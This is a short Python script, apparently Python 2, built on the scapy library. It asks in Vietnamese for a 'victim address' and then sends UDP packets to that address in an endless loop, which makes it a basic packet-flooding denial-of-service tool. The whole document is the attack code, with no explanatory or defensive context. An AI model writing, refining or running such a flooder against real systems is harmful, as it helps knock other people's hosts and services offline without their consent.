from scapy.all import *;
diachi=raw_input("Nhap dia chi nan nhan: ")
while True:
    ip=IP(dst=diachi)
    packet=ip/UDP()
    send(packet)